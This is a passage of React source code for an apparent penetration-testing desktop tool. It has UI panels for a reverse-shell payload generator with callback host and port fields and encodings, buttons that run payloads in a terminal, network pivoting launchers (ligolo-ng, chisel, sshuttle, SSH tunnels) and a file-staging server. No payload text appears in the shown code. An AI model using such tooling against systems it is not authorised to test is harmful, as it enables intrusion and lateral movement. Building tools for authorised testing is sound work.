                <div className="drawer-panel drawer-payloads-panel" style={{ display: 'flex', flexDirection: 'column', height: '100%', overflow: 'hidden' }}>
                  <div className="sidebar-header">
                    <h2>Payload Generator</h2>
                    <div className="sidebar-actions" style={{ display: 'flex', gap: '4px' }}>
                      <button
                        type="button"
                        className="btn-primary btn-sm"
                        onClick={() => setShowPayloadGeneratorModal(true)}
                        title="Open Full Payload Generator & Template Editor"
                      >
                        Full View
                      </button>
                    </div>
                  </div>

                  {/* Callback Parameters */}
                  <div
                    style={{
                      padding: '0.55rem 0.75rem',
                      borderBottom: '1px solid color-mix(in srgb, var(--accent-bright) 20%, transparent)',
                      display: 'flex',
                      flexDirection: 'column',
                      gap: '0.38rem',
                      flexShrink: 0,
                    }}
                  >
                    <div style={{ display: 'flex', gap: '0.35rem', alignItems: 'center' }}>
                      <input
                        type="text"
                        className="cyber-hud-input"
                        aria-label="Sidebar Payload LHOST"
                        placeholder="LHOST (10.10.14.1)"
                        value={sidebarPayloadLhost}
                        onChange={(e) => setSidebarPayloadLhost(e.target.value)}
                        style={{ flex: 1, minWidth: 0, fontSize: '0.73rem', padding: '0.28rem 0.45rem' }}
                      />
                      <input
                        type="number"
                        className="cyber-hud-input"
                        aria-label="Sidebar Payload LPORT"
                        value={sidebarPayloadLport}
                        onChange={(e) => setSidebarPayloadLport(parseInt(e.target.value, 10) || 443)}
                        style={{ width: '68px', fontSize: '0.73rem', padding: '0.28rem 0.45rem' }}
                      />
                    </div>
                    <div style={{ display: 'flex', gap: '0.35rem', alignItems: 'center' }}>
                      {sidebarPayloadLocalIPs.length > 0 && (
                        <select
                          aria-label="Sidebar Interface LHOST"
                          className="cyber-hud-select"
                          value=""
                          onChange={(e) => {
                            if (e.target.value) setSidebarPayloadLhost(e.target.value);
                          }}
                          style={{ flex: 1, minWidth: 0, fontSize: '0.7rem', padding: '0.25rem 0.4rem' }}
                        >
                          <option value="">NICs ({sidebarPayloadLocalIPs.length})...</option>
                          {sidebarPayloadLocalIPs.map((nic) => (
                            <option key={`${nic.interface}-${nic.ip}`} value={nic.ip}>
                              {nic.isVpn ? '[VPN] ' : ''}{nic.interface}: {nic.ip}
                            </option>
                          ))}
                        </select>
                      )}
                      <select
                        aria-label="Sidebar Payload Encoding"
                        className="cyber-hud-select"
                        value={sidebarPayloadEncoding}
                        onChange={(e) => setSidebarPayloadEncoding(e.target.value as PayloadEncoding)}
                        style={{ flex: 1, minWidth: 0, fontSize: '0.7rem', padding: '0.25rem 0.4rem' }}
                      >
                        <option value="none">Raw</option>
                        <option value="base64">Base64</option>
                        <option value="url">URL</option>
                        <option value="powershell_b64">PS B64 (-e)</option>
                        <option value="hex">Hex</option>
                      </select>
                    </div>
                  </div>

                  {/* Search & OS Filter */}
                  <div style={{ padding: '0.5rem 0.75rem 0.25rem', flexShrink: 0 }}>
                    <input
                      className="sidebar-search"
                      aria-label="Filter Sidebar Payloads"
                      placeholder="Search payloads & shells..."
                      value={sidebarPayloadQuery}
                      onChange={(e) => setSidebarPayloadQuery(e.target.value)}
                      style={{ marginBottom: '0.35rem' }}
                    />
                    <div className="drawer-filter-bar" style={{ marginBottom: 0 }}>
                      <button
                        type="button"
                        className={`drawer-filter-btn ${sidebarPayloadOs === 'all' ? 'active' : ''}`}
                        onClick={() => setSidebarPayloadOs('all')}
                      >
                        ALL
                      </button>
                      <button
                        type="button"
                        className={`drawer-filter-btn ${sidebarPayloadOs === 'linux' ? 'active' : ''}`}
                        onClick={() => setSidebarPayloadOs('linux')}
                      >
                        LINUX
                      </button>
                      <button
                        type="button"
                        className={`drawer-filter-btn ${sidebarPayloadOs === 'windows' ? 'active' : ''}`}
                        onClick={() => setSidebarPayloadOs('windows')}
                      >
                        WINDOWS
                      </button>
                    </div>
                  </div>

                  {/* Scrollable Payload List */}
                  <div className="drawer-items-list" style={{ flex: 1, minHeight: 0, overflowY: 'auto' }}>
                    {filteredSidebarPayloads.length === 0 ? (
                      <div className="drawer-empty-state">
                        <span>No payload templates loaded.</span>
                        <button
                          type="button"
                          className="cyber-hud-btn btn-primary btn-sm"
                          style={{ marginTop: '0.5rem', display: 'inline-flex', alignItems: 'center', gap: '0.35rem' }}
                          onClick={() => setShowPayloadGeneratorModal(true)}
                        >
                          <CyberIcon name="plus" size={12} />
                          <span>Open Payload Editor</span>
                        </button>
                      </div>
                    ) : (
                      filteredSidebarPayloads.map((tmpl) => {
                        const isSelected = sidebarSelectedPayloadId === tmpl.id;
                        return (
                          <div
                            key={tmpl.id}
                            className="drawer-card"
                            style={{
                              cursor: 'pointer',
                              borderColor: isSelected ? 'color-mix(in srgb, var(--accent-bright) 75%, transparent)' : undefined,
                              backgroundColor: isSelected ? 'color-mix(in srgb, var(--accent-bright) 8%, transparent)' : undefined,
                            }}
                            onClick={() => {
                              setSidebarSelectedPayloadId(tmpl.id);
                              if (tmpl.defaultPort) setSidebarPayloadLport(tmpl.defaultPort);
                            }}
                          >
                            <div className="drawer-card-header">
                              <span className="drawer-card-title">{tmpl.name}</span>
                              <span className="drawer-badge">{(tmpl.os || 'any').toUpperCase()}</span>
                            </div>
                            <div className="drawer-card-meta">
                              <span>{tmpl.kind}</span>
                              <span>{tmpl.shell}</span>
                            </div>
                          </div>
                        );
                      })
                    )}
                  </div>

                  {/* Rendered Command Preview + Inject Actions */}
                  {sidebarPayloadPreview && (
                    <div
                      style={{
                        padding: '0.55rem 0.75rem',
                        borderTop: '1px solid color-mix(in srgb, var(--accent-bright) 25%, transparent)',
                        background: 'rgba(4, 10, 18, 0.96)',
                        flexShrink: 0,
                        display: 'flex',
                        flexDirection: 'column',
                        gap: '0.35rem',
                      }}
                    >
                      {sidebarPayloadPreview.opsecWarnings && sidebarPayloadPreview.opsecWarnings.length > 0 && (
                        <div style={{ fontSize: '0.66rem', color: '#fbbf24' }}>
                          {sidebarPayloadPreview.opsecWarnings[0]}
                        </div>
                      )}
                      <pre
                        style={{
                          margin: 0,
                          padding: '0.4rem 0.5rem',
                          background: 'rgba(2, 6, 12, 0.9)',
                          border: '1px solid color-mix(in srgb, var(--accent-bright) 25%, transparent)',
                          color: '#a7f3d0',
                          fontSize: '0.68rem',
                          fontFamily: 'JetBrains Mono, monospace',
                          maxHeight: '78px',
                          overflowY: 'auto',
                          whiteSpace: 'pre-wrap',
                          wordBreak: 'break-all',
                        }}
                      >
                        {sidebarPayloadPreview.rendered}
                      </pre>
                      <div style={{ display: 'flex', gap: '0.35rem' }}>
                        <button
                          type="button"
                          className="drawer-action-btn"
                          onClick={() => {
                            void navigator.clipboard?.writeText(sidebarPayloadPreview.rendered);
                            setStatusMessage('Copied rendered payload to clipboard.');
                          }}
                        >
                          <CyberIcon name="copy" size={11} />
                          <span>Copy</span>
                        </button>
                        <button
                          type="button"
                          className="drawer-action-btn"
                          disabled={!sessionId}
                          onClick={() => {
                            if (sessionId) {
                              void getWailsBindings()?.WriteTerminal?.(sessionId, sidebarPayloadPreview.rendered);
                              setStatusMessage('Inserted payload into active terminal.');
                            }
                          }}
                        >
                          <CyberIcon name="edit" size={11} />
                          <span>Insert</span>
                        </button>
                        <button
                          type="button"
                          className="drawer-action-btn run-btn"
                          disabled={!sessionId}
                          onClick={() => {
                            if (sessionId) {
                              void getWailsBindings()?.WriteTerminal?.(sessionId, sidebarPayloadPreview.rendered + '\n');
                              setStatusMessage('Executed payload in active terminal.');
                            }
                          }}
                        >
                          <CyberIcon name="play" size={11} />
                          <span>Run</span>
                        </button>
                      </div>
                    </div>
                  )}
                </div>
              )}

              {activeSidebarPanel === 'pivot' && (
                <div className="drawer-panel drawer-pivot-panel">
                  <div className="sidebar-header">
                    <h2>Network Pivoting</h2>
                    <div className="sidebar-actions">
                      <button
                        type="button"
                        className="btn-primary btn-sm"
                        onClick={() => setShowPivotManagerModal(true)}
                        title="Open Full Network Pivoting Manager"
                      >
                        Full View
                      </button>
                    </div>
                  </div>

                  {/* TOP: Quick Pivot Launcher */}
                  <div
                    style={{
                      padding: '0.65rem 0.75rem',
                      borderBottom: '1px solid color-mix(in srgb, var(--accent-bright) 20%, transparent)',
                      display: 'flex',
                      flexDirection: 'column',
                      gap: '0.45rem',
                    }}
                  >
                    <div style={{ fontSize: '0.68rem', fontWeight: 700, color: 'var(--accent-bright)', letterSpacing: '0.07em' }}>
                      PIVOT LAUNCHER
                    </div>
                    <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '0.25rem' }}>
                      {(
                        [
                          { id: 'ligolo-ng', label: 'Ligolo' },
                          { id: 'chisel', label: 'Chisel' },
                          { id: 'sshuttle', label: 'sshuttle' },
                          { id: 'ssh-forward', label: '2-Step' },
                        ] as { id: PivotTool; label: string }[]
                      ).map((opt) => (
                        <button
                          key={opt.id}
                          type="button"
                          className={`cyber-pill-btn ${sidebarPivotTool === opt.id ? 'active' : ''}`}
                          style={{ padding: '0.25rem 0.3rem', fontSize: '0.66rem', textAlign: 'center' }}
                          onClick={() => {
                            setSidebarPivotTool(opt.id);
                            if (opt.id === 'ligolo-ng') setSidebarPivotPort(11601);
                            else if (opt.id === 'chisel') setSidebarPivotPort(8443);
                            else if (opt.id === 'ssh-forward') {
                              setSidebarPivotPort(sidebarPivotForwardMode === 'socks' ? 1080 : 13389);
                              if (!sidebarPivotRelayHostId && vaultSummary.hosts.length > 0) {
                                const h = vaultSummary.hosts[0];
                                setSidebarPivotRelayHostId(h.id);
                                setSidebarPivotSshTarget(`${h.effectiveUser || 'user'}@${h.address}`);
                              }
                            }
                          }}
                        >
                          {opt.label}
                        </button>
                      ))}
                    </div>

                    {sidebarPivotTool === 'sshuttle' ? (
                      <>
                        {vaultSummary.hosts.length > 0 && (
                          <select
                            className="cyber-hud-select"
                            aria-label="Sidebar sshuttle Jump Host"
                            value=""
                            onChange={(e) => {
                              const picked = vaultSummary.hosts.find((h) => h.id === e.target.value);
                              if (picked) {
                                setSidebarPivotSshTarget(`${picked.effectiveUser || 'user'}@${picked.address}`);
                              }
                            }}
                          >
                            <option value="">-- Pick SSH Jump Host --</option>
                            {vaultSummary.hosts.map((h) => (
                              <option key={h.id} value={h.id}>
                                {h.label} ({h.effectiveUser || 'user'}@{h.address})
                              </option>
                            ))}
                          </select>
                        )}
                        <input
                          type="text"
                          className="cyber-hud-input"
                          aria-label="sshuttle SSH target"
                          placeholder="user@jump-host"
                          value={sidebarPivotSshTarget}
                          onChange={(e) => setSidebarPivotSshTarget(e.target.value)}
                        />
                        <input
                          type="text"
                          className="cyber-hud-input"
                          aria-label="sshuttle subnets"
                          placeholder="Subnets CIDR (e.g. 10.10.20.0/24)"
                          value={sidebarPivotSubnets}
                          onChange={(e) => setSidebarPivotSubnets(e.target.value)}
                        />
                      </>
                    ) : sidebarPivotTool === 'ssh-forward' ? (
                      <>
                        <select
                          className="cyber-hud-select"
                          aria-label="2-Step SSH Relay Host"
                          value={sidebarPivotRelayHostId}
                          onChange={(e) => {
                            setSidebarPivotRelayHostId(e.target.value);
                            const picked = vaultSummary.hosts.find((h) => h.id === e.target.value);
                            if (picked) {
                              setSidebarPivotSshTarget(`${picked.effectiveUser || 'user'}@${picked.address}`);
                            }
                          }}
                        >
                          <option value="">-- Step 1: Reachable SSH Relay --</option>
                          {vaultSummary.hosts.map((h) => (
                            <option key={h.id} value={h.id}>
                              {h.label} ({h.address})
                            </option>
                          ))}
                        </select>
                        <div style={{ display: 'grid', gridTemplateColumns: '1fr 82px', gap: '0.3rem' }}>
                          <select
                            className="cyber-hud-select"
                            aria-label="2-Step Forward Mode"
                            value={sidebarPivotForwardMode}
                            onChange={(e) => {
                              const m = e.target.value as 'local' | 'socks';
                              setSidebarPivotForwardMode(m);
                              setSidebarPivotPort(m === 'socks' ? 1080 : 13389);
                            }}
                          >
                            <option value="local">Direct Port (-L)</option>
                            <option value="socks">Dynamic SOCKS5 (-D)</option>
                          </select>
                          <input
                            type="number"
                            className="cyber-hud-input"
                            aria-label="Local forward port"
                            value={sidebarPivotPort}
                            onChange={(e) => setSidebarPivotPort(Number(e.target.value) || 0)}
                          />
                        </div>
                        {sidebarPivotForwardMode === 'local' ? (
                          <input
                            type="text"
                            className="cyber-hud-input"
                            aria-label="Internal Target Host and Port"
                            placeholder="Target IP:Port (e.g. 10.10.20.10:3389)"
                            value={sidebarPivotForwardTarget}
                            onChange={(e) => setSidebarPivotForwardTarget(e.target.value)}
                          />
                        ) : (
                          <input
                            type="text"
                            className="cyber-hud-input"
                            aria-label="Internal Target Subnets"
                            placeholder="Target Subnet CIDR (10.10.20.0/24)"
                            value={sidebarPivotSubnets}
                            onChange={(e) => setSidebarPivotSubnets(e.target.value)}
                          />
                        )}
                      </>
                    ) : (
                      <>
                        <div style={{ display: 'grid', gridTemplateColumns: '84px 1fr', gap: '0.3rem' }}>
                          <input
                            type="number"
                            className="cyber-hud-input"
                            aria-label="Pivot listen port"
                            placeholder="Port"
                            value={sidebarPivotPort}
                            onChange={(e) => setSidebarPivotPort(Number(e.target.value) || 0)}
                          />
                          <input
                            type="text"
                            className="cyber-hud-input"
                            aria-label="Pivot subnets CIDR"
                            placeholder="10.10.20.0/24"
                            value={sidebarPivotSubnets}
                            onChange={(e) => setSidebarPivotSubnets(e.target.value)}
                          />
                        </div>
                        <div style={{ display: 'flex', gap: '0.25rem', flexWrap: 'wrap' }}>
                          {sidebarPivotLocalIPs.slice(0, 3).map((ipItem) => (
                            <button
                              key={`${ipItem.interface}-${ipItem.ip}`}
                              type="button"
                              className={`cyber-pill-btn ${sidebarPivotLhost === ipItem.ip ? 'active' : ''}`}
                              style={{ fontSize: '0.62rem', padding: '2px 5px' }}
                              onClick={() => setSidebarPivotLhost(ipItem.ip)}
                            >
                              {ipItem.isVpn ? ipItem.interface : ipItem.ip}
                            </button>
                          ))}
                        </div>
                        <input
                          type="text"
                          className="cyber-hud-input"
                          aria-label="Callback LHOST"
                          placeholder="Callback LHOST (e.g. 10.10.14.1)"
                          value={sidebarPivotLhost}
                          onChange={(e) => setSidebarPivotLhost(e.target.value)}
                        />
                      </>
                    )}

                    <button
                      type="button"
                      className="cyber-hud-btn btn-primary btn-sm"
                      disabled={sidebarPivotBusy}
                      style={{ display: 'inline-flex', alignItems: 'center', justifyContent: 'center', gap: '0.35rem', width: '100%' }}
                      onClick={() => {
                        void (async () => {
                          const api = getWailsBindings();
                          if (!api) return;
                          setSidebarPivotBusy(true);
                          try {
                            if (sidebarPivotTool === 'ssh-forward') {
                              if (!api.LaunchTwoStepSshPivot) return;
                              const relayId = sidebarPivotRelayHostId || vaultSummary.hosts[0]?.id || '';
                              const [tHost, tPortRaw] = sidebarPivotForwardTarget.split(':');
                              await api.LaunchTwoStepSshPivot({
                                relayHostId: relayId,
                                engagementId: activeEngagement?.id || '',
                                mode: sidebarPivotForwardMode,
                                bindAddress: '127.0.0.1',
                                localPort: Number(sidebarPivotPort) || (sidebarPivotForwardMode === 'socks' ? 1080 : 13389),
                                targetHost: sidebarPivotForwardMode === 'socks' ? '' : (tHost || '').trim(),
                                targetPort: sidebarPivotForwardMode === 'socks' ? 0 : Number(tPortRaw) || 0,
                                name: `2-Step ${sidebarPivotForwardMode === 'socks' ? 'SOCKS5' : sidebarPivotForwardTarget}`,
                                saveRule: true,
                              });
                              if (api.GetActiveTunnels) {
                                const tunList = await api.GetActiveTunnels();
                                setActiveTunnels(tunList || []);
                              }
                              setStatusMessage('Launched 2-Step SSH relay tunnel.');
                            } else {
                              if (!api.StartPivotInstance) return;
                              const subs = sidebarPivotSubnets.split(/[\s,;]+/).map((s) => s.trim()).filter(Boolean);
                              await api.StartPivotInstance({
                                id: '',
                                engagementId: activeEngagement?.id || '',
                                name: `Quick ${sidebarPivotTool}`,
                                kind: sidebarPivotTool === 'ligolo-ng' ? 'ligolo' : sidebarPivotTool,
                                tool: sidebarPivotTool,
                                bindAddress: '0.0.0.0',
                                listenPort: sidebarPivotTool === 'sshuttle' ? 0 : Number(sidebarPivotPort) || 11601,
                                socksPort: 1080,
                                interfaceName: 'ligolo',
                                subnets: subs,
                                reverse: true,
                                selfCert: true,
                                ignoreCert: true,
                                sshTarget: sidebarPivotTool === 'sshuttle' ? sidebarPivotSshTarget.trim() : undefined,
                              });
                              if (api.ListActivePivotInstances) {
                                const list = await api.ListActivePivotInstances();
                                setDrawerPivots(list || []);
                              }
                              setStatusMessage(`Started ${sidebarPivotTool} pivot.`);
                            }
                          } catch (err: unknown) {
                            setStatusMessage(err instanceof Error ? err.message : String(err));
                          } finally {
                            setSidebarPivotBusy(false);
                          }
                        })();
                      }}
                    >
                      <CyberIcon name="play" size={12} />
                      <span>
                        {sidebarPivotBusy
                          ? 'Starting...'
                          : sidebarPivotTool === 'ssh-forward'
                            ? 'Start 2-Step SSH Tunnel'
                            : sidebarPivotTool === 'sshuttle'
                              ? 'Launch sshuttle'
                              : `Launch ${sidebarPivotTool}`}
                      </span>
                    </button>

                    {/* Active Pivot & Forward Tunnels Strip */}
                    {(drawerPivots.some((p) => p.status === 'running') || activeTunnels.some((t) => t.status === 'active')) && (
                      <div style={{ display: 'flex', flexDirection: 'column', gap: '0.25rem', marginTop: '0.15rem' }}>
                        {drawerPivots
                          .filter((p) => p.status === 'running')
                          .map((p) => (
                            <div
                              key={p.id}
                              style={{
                                display: 'flex',
                                alignItems: 'center',
                                justifyContent: 'space-between',
                                background: 'rgba(16, 185, 129, 0.1)',
                                border: '1px solid rgba(16, 185, 129, 0.35)',
                                padding: '3px 6px',
                                fontSize: '0.67rem',
                                color: '#6ee7b7',
                              }}
                            >
                              <span style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                                {p.tool} {p.listenPort ? `:${p.listenPort}` : ''} (PID {p.pid})
                              </span>
                              <button
                                type="button"
                                className="drawer-action-btn"
                                style={{ color: '#f87171', padding: '1px 5px' }}
                                onClick={() => {
                                  void getWailsBindings()?.StopPivotInstance?.(p.id).then(() => {
                                    void getWailsBindings()?.ListActivePivotInstances?.().then((l) => setDrawerPivots(l || []));
                                  });
                                }}
                              >
                                Stop
                              </button>
                            </div>
                          ))}
                        {activeTunnels
                          .filter((t) => t.status === 'active')
                          .map((t) => (
                            <div
                              key={t.id}
                              style={{
                                display: 'flex',
                                alignItems: 'center',
                                justifyContent: 'space-between',
                                background: 'color-mix(in srgb, var(--accent-bright) 10%, transparent)',
                                border: '1px solid color-mix(in srgb, var(--accent-bright) 35%, transparent)',
                                padding: '3px 6px',
                                fontSize: '0.67rem',
                                color: 'var(--accent-text)',
                              }}
                            >
                              <span style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                                SSH -{t.type} :{t.bindPort}{t.targetHost ? ` -> ${t.targetHost}:${t.targetPort}` : ''}
                              </span>
                              <button
                                type="button"
                                className="drawer-action-btn"
                                style={{ color: '#f87171', padding: '1px 5px' }}
                                onClick={() => {
                                  void getWailsBindings()?.StopForwardTunnel?.(t.id).then(() => {
                                    void getWailsBindings()?.GetActiveTunnels?.().then((l) => setActiveTunnels(l || []));
                                  });
                                }}
                              >
                                Stop
                              </button>
                            </div>
                          ))}
                      </div>
                    )}
                  </div>

                  {/* BOTTOM: Target / Relay Command */}
                  <div style={{ padding: '0.65rem 0.75rem', display: 'flex', flexDirection: 'column', gap: '0.45rem', flex: 1, overflowY: 'auto' }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                      <span style={{ fontSize: '0.68rem', fontWeight: 700, color: 'var(--accent-bright)', letterSpacing: '0.07em' }}>
                        TARGET COMMAND
                      </span>
                      <div style={{ display: 'flex', gap: '0.2rem' }}>
                        <button
                          type="button"
                          className={`cyber-pill-btn ${sidebarPivotTargetOs === 'linux' ? 'active' : ''}`}
                          style={{ padding: '1px 6px', fontSize: '0.63rem' }}
                          onClick={() => setSidebarPivotTargetOs('linux')}
                        >
                          Linux
                        </button>
                        <button
                          type="button"
                          className={`cyber-pill-btn ${sidebarPivotTargetOs === 'windows' ? 'active' : ''}`}
                          style={{ padding: '1px 6px', fontSize: '0.63rem' }}
                          onClick={() => setSidebarPivotTargetOs('windows')}
                        >
                          Windows
                        </button>
                      </div>
                    </div>

                    {(() => {
                      const targetCmd =
                        sidebarPivotTargetOs === 'windows'
                          ? sidebarPivotCommands?.windowsAgentCmd || ''
                          : sidebarPivotCommands?.linuxAgentCmd || '';
                      return (
                        <div className="drawer-card" style={{ padding: '0.5rem' }}>
                          <pre
                            style={{
                              margin: '0 0 0.45rem 0',
                              fontSize: '0.69rem',
                              fontFamily: 'JetBrains Mono, monospace',
                              color: '#e2e8f0',
                              whiteSpace: 'pre-wrap',
                              wordBreak: 'break-all',
                              background: 'rgba(2, 6, 23, 0.75)',
                              padding: '0.4rem',
                              border: '1px solid color-mix(in srgb, var(--accent-bright) 18%, transparent)',
                            }}
                          >
                            {targetCmd || 'Configure pivot above to generate command...'}
                          </pre>
                          <div className="drawer-card-actions">
                            <button
                              type="button"
                              className="drawer-action-btn"
                              onClick={() => {
                                if (targetCmd && navigator.clipboard?.writeText) {
                                  void navigator.clipboard.writeText(targetCmd);
                                  setStatusMessage('Copied pivot command to clipboard.');
                                }
                              }}
                            >
                              <CyberIcon name="copy" size={11} />
                              <span>Copy</span>
                            </button>
                            <button
                              type="button"
                              className="drawer-action-btn"
                              disabled={!sessionId}
                              onClick={() => {
                                if (sessionId && targetCmd) void getWailsBindings()?.WriteTerminal?.(sessionId, targetCmd);
                              }}
                            >
                              <CyberIcon name="terminal" size={11} />
                              <span>Insert</span>
                            </button>
                            <button
                              type="button"
                              className="drawer-action-btn"
                              disabled={!sessionId}
                              onClick={() => {
                                if (sessionId && targetCmd) void getWailsBindings()?.WriteTerminal?.(sessionId, `${targetCmd}\n`);
                              }}
                            >
                              <CyberIcon name="play" size={11} />
                              <span>Run</span>
                            </button>
                          </div>
                        </div>
                      );
                    })()}

                    {sidebarPivotCommands?.proxychainsLine && (
                      <div style={{ fontSize: '0.67rem', color: '#94a3b8', fontFamily: 'JetBrains Mono, monospace' }}>
                        <span style={{ color: '#64748b' }}>Proxychains: </span>
                        <code style={{ color: '#6ee7b7' }}>{sidebarPivotCommands.proxychainsLine}</code>
                      </div>
                    )}
                  </div>
                </div>
              )}

              {activeSidebarPanel === 'transfer' && (
                <div className="drawer-panel drawer-transfer-panel" style={{ display: 'flex', flexDirection: 'column', height: '100%', overflow: 'hidden' }}>
                  <div className="sidebar-header">
                    <h2>File Transfer</h2>
                    <div className="sidebar-actions" style={{ display: 'flex', gap: '4px' }}>
                      <button
                        type="button"
                        className="btn-primary btn-sm"
                        onClick={() => setShowFileTransferModal(true)}
                        title="Open Full File Transfer Helper Window"
                      >
                        Full View
                      </button>
                    </div>
                  </div>

                  {/* TOP: Staging Directory, Server Engine & Launcher */}
                  <div
                    style={{
                      padding: '0.6rem 0.75rem',
                      borderBottom: '1px solid color-mix(in srgb, var(--accent-bright) 20%, transparent)',
                      display: 'flex',
                      flexDirection: 'column',
                      gap: '0.42rem',
                      flexShrink: 0,
                    }}
                  >
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                      <span style={{ fontSize: '0.68rem', fontWeight: 700, color: 'var(--accent-bright)', letterSpacing: '0.07em' }}>
                        STAGING LAUNCHER &amp; MONITOR
                      </span>
                      <button
                        type="button"
                        className="drawer-action-btn"
                        style={{ padding: '1px 6px', fontSize: '0.63rem' }}
                        onClick={() => {
                          const api = getWailsBindings();
                          if (api?.ListFileTransferServers) {
                            void api.ListFileTransferServers().then((s) => setDashboardFileServers(s || [])).catch(() => { });
                          }
                          if (sidebarTransferDir.trim() && api?.ListHostedTransferFiles) {
                            setSidebarTransferLoadingFiles(true);
                            void api.ListHostedTransferFiles(sidebarTransferDir.trim())
                              .then((files) => setSidebarTransferFiles(files || []))
                              .catch(() => { })
                              .finally(() => setSidebarTransferLoadingFiles(false));
                          }
                        }}
                        title="Refresh running servers and folder listing"
                      >
                        Refresh
                      </button>
                    </div>

                    {/* Staging Root Folder Input + Browse */}
                    <div style={{ display: 'flex', gap: '0.28rem' }}>
                      <input
                        type="text"
                        className="cyber-hud-input"
                        aria-label="Sidebar Staging Directory"
                        placeholder="/opt/tools or C:\Tools"
                        value={sidebarTransferDir}
                        onChange={(e) => setSidebarTransferDir(e.target.value)}
                        onKeyDown={(e) => {
                          if (e.key === 'Enter' && sidebarTransferDir.trim()) {
                            const api = getWailsBindings();
                            if (api?.ListHostedTransferFiles) {
                              setSidebarTransferLoadingFiles(true);
                              void api.ListHostedTransferFiles(sidebarTransferDir.trim())
                                .then((files) => setSidebarTransferFiles(files || []))
                                .catch((err: unknown) => setSidebarTransferError(err instanceof Error ? err.message : String(err)))
                                .finally(() => setSidebarTransferLoadingFiles(false));
                            }
                          }
                        }}
                        style={{ flex: 1, minWidth: 0, fontSize: '0.7rem' }}
                      />
                      <button
                        type="button"
                        className="cyber-hud-btn btn-secondary btn-sm"
                        style={{ padding: '0 0.45rem', flexShrink: 0 }}
                        onClick={() => {
                          void (async () => {
                            if (remoteExecContext.mode === 'agent' && remoteExecContext.activeAgent) {
                              setShowRemoteDirPicker(true);
                              return;
                            }
                            const api = getWailsBindings();
                            const selected = await api?.SelectDirectoryDialog?.('Select Staging Directory to Serve');
                            if (selected && selected.trim()) {
                              const clean = selected.trim();
                              setSidebarTransferDir(clean);
                              setSidebarTransferError('');
                              if (api?.ListHostedTransferFiles) {
                                setSidebarTransferLoadingFiles(true);
                                try {
                                  const files = await api.ListHostedTransferFiles(clean);
                                  setSidebarTransferFiles(files || []);
                                } catch (err: unknown) {
                                  setSidebarTransferError(err instanceof Error ? err.message : String(err));
                                } finally {
                                  setSidebarTransferLoadingFiles(false);
                                }
                              }
                            }
                          })();
                        }}
                        title="Choose staging folder"
                      >
                        <CyberIcon name="folder" size={12} />
                      </button>
                    </div>

                    {/* Engine Pills */}
                    <div style={{ display: 'grid', gridTemplateColumns: 'repeat(5, 1fr)', gap: '0.2rem' }}>
                      {(
                        [
                          { id: 'builtin', label: 'HTTP' },
                          { id: 'python3', label: 'Py3' },
                          { id: 'updog', label: 'Updog' },
                          { id: 'impacket-smb', label: 'SMB' },
                          { id: 'php', label: 'PHP' },
                        ] as { id: FileServerKind; label: string }[]
                      ).map((eng) => (
                        <button
                          key={eng.id}
                          type="button"
                          className={`cyber-pill-btn ${sidebarTransferKind === eng.id ? 'active' : ''}`}
                          style={{ padding: '0.2rem 0.2rem', fontSize: '0.62rem', textAlign: 'center' }}
                          onClick={() => {
                            setSidebarTransferKind(eng.id);
                            if (eng.id === 'impacket-smb' && sidebarTransferPort === 8000) setSidebarTransferPort(445);
                            else if (eng.id !== 'impacket-smb' && sidebarTransferPort === 445) setSidebarTransferPort(8000);
                          }}
                        >
                          {eng.label}
                        </button>
                      ))}
                    </div>

                    {/* Bind & Port + Upload */}
                    <div style={{ display: 'grid', gridTemplateColumns: '1fr 72px', gap: '0.28rem' }}>
                      <input
                        type="text"
                        className="cyber-hud-input"
                        aria-label="Sidebar Staging Bind Address"
                        placeholder="0.0.0.0"
                        value={sidebarTransferBind}
                        onChange={(e) => setSidebarTransferBind(e.target.value)}
                      />
                      <input
                        type="number"
                        className="cyber-hud-input"
                        aria-label="Sidebar Staging Port"
                        min={1}
                        max={65535}
                        value={sidebarTransferPort}
                        onChange={(e) => setSidebarTransferPort(Number(e.target.value) || 8000)}
                      />
                    </div>

                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: '0.3rem', flexWrap: 'wrap' }}>
                      <div style={{ display: 'flex', gap: '0.2rem' }}>
                        {[80, 8000, 8080, 443].map((p) => (
                          <button
                            key={p}
                            type="button"
                            className={`cyber-pill-btn ${sidebarTransferPort === p ? 'active' : ''}`}
                            style={{ fontSize: '0.6rem', padding: '1px 5px' }}
                            onClick={() => setSidebarTransferPort(p)}
                          >
                            :{p}
                          </button>
                        ))}
                      </div>
                      <label style={{ display: 'inline-flex', alignItems: 'center', gap: '0.28rem', fontSize: '0.65rem', color: '#cbd5e1', cursor: 'pointer' }}>
                        <input
                          type="checkbox"
                          checked={sidebarTransferUpload}
                          onChange={(e) => setSidebarTransferUpload(e.target.checked)}
                        />
                        <span>/upload</span>
                      </label>
                    </div>

                    {sidebarTransferError && (
                      <div style={{ fontSize: '0.66rem', color: '#f87171', background: 'rgba(239,68,68,0.12)', border: '1px solid rgba(239,68,68,0.4)', padding: '3px 6px', borderRadius: 3 }}>
                        {sidebarTransferError}
                      </div>
                    )}

                    {sidebarTransferKind === 'builtin' ? (
                      <button
                        type="button"
                        className="cyber-hud-btn btn-primary btn-sm"
                        disabled={sidebarTransferBusy}
                        style={{ display: 'inline-flex', alignItems: 'center', justifyContent: 'center', gap: '0.35rem', width: '100%' }}
                        onClick={() => {
                          void (async () => {
                            const api = getWailsBindings();
                            if (!api?.StartFileTransferServer) return;
                            setSidebarTransferBusy(true);
                            setSidebarTransferError('');
                            try {
                              const started = await api.StartFileTransferServer({
                                id: '',
                                name: `HTTP Staging :${sidebarTransferPort}`,
                                kind: 'builtin',
                                directory: sidebarTransferDir.trim() || '.',
                                bindAddress: sidebarTransferBind.trim() || '0.0.0.0',
                                port: Number(sidebarTransferPort) || 8000,
                                enableUpload: sidebarTransferUpload,
                                useTLS: false,
                              });
                              if (api.ListFileTransferServers) {
                                const list = await api.ListFileTransferServers();
                                setDashboardFileServers(list || []);
                              }
                              setStatusMessage(`Started staging server on ${started.bindAddress}:${started.port}.`);
                            } catch (err: unknown) {
                              setSidebarTransferError(err instanceof Error ? err.message : String(err));
                            } finally {
                              setSidebarTransferBusy(false);
                            }
                          })();
                        }}
                      >
                        <CyberIcon name="play" size={12} />
